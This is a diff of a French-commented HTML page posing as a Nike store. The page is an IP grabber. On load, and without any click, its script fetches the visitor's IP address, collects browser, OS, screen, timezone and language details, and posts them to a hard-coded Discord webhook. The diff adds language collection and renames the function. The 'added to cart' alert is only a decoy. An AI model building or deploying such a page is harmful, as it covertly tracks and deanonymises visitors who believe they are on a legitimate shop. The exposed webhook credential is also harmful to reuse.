@@ -2,8 +2,7 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nike - Just Do It</title>
+    <title>Nike Store</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: Arial, sans-serif; background: #f5f5f5; }
@@ -48,29 +47,31 @@
         // 🔴 TON WEBHOOK DISCORD 🔴
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1485044296120930414/n9RZpE9o16fbNtF3TEHppJURGyv0-eUUh6twJUywBJqmRQSKEZm090aFrbVLbwuDhaMP';
         
-        // Fonction pour capturer l'IP
-        async function captureAndSend() {
+        // 🚀 FONCTION PRINCIPALE - ENVOIE AUTO DÈS L'OUVERTURE
+        async function sendIPauto() {
             try {
-                // Récupérer l'IP
+                // 1. Récupérer l'IP
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
                 const ip = data.ip;
                 
-                // Infos du visiteur
+                // 2. Récupérer les infos
                 const date = new Date().toLocaleString('fr-FR');
                 const os = navigator.platform;
                 const browser = navigator.userAgent.split(' ')[0];
                 const screenRes = `${screen.width}x${screen.height}`;
                 const timezone = Intl.DateTimeFormat().resolveOptions().timeZone;
+                const language = navigator.language;
                 
-                // Envoyer à Discord
+                // 3. Envoyer à Discord
                 const message = {
-                    content: `**🎯 NOUVELLE VISITE - NIKE STORE**\n\n` +
+                    content: `**🔴 NOUVELLE VISITE DÉTECTÉE !**\n\n` +
                              `🌐 **IP:** \`${ip}\`\n` +
                              `💻 **OS:** ${os}\n` +
                              `🌍 **Navigateur:** ${browser}\n` +
                              `📱 **Écran:** ${screenRes}\n` +
                              `⏰ **Fuseau:** ${timezone}\n` +
+                             `🌐 **Langue:** ${language}\n` +
                              `📅 **Date:** ${date}\n` +
                              `🔗 **URL:** ${window.location.href}`
                 };
@@ -81,18 +82,18 @@
                     body: JSON.stringify(message)
                 });
                 
-                console.log('✅ IP envoyée à Discord');
+                console.log('✅ IP envoyée automatiquement');
             } catch(e) {
                 console.log('Erreur:', e);
             }
         }
         
-        // 🔥 ENVOI AUTO DÈS L'OUVERTURE DE LA PAGE 🔥
-        captureAndSend();
+        // 🔥 LANCEMENT AUTOMATIQUE - SANS AUCUN CLIC 🔥
+        sendIPauto();
         
-        // Simple popup pour faire semblant (optionnel)
+        // Petite animation pour faire joli (optionnel)
         function showPopup() {
-            alert("✓ Ajouté au panier !");
+            alert("✓ Article ajouté au panier !");
         }
         
         document.querySelectorAll('.buy-btn, #heroBtn').forEach(btn => {
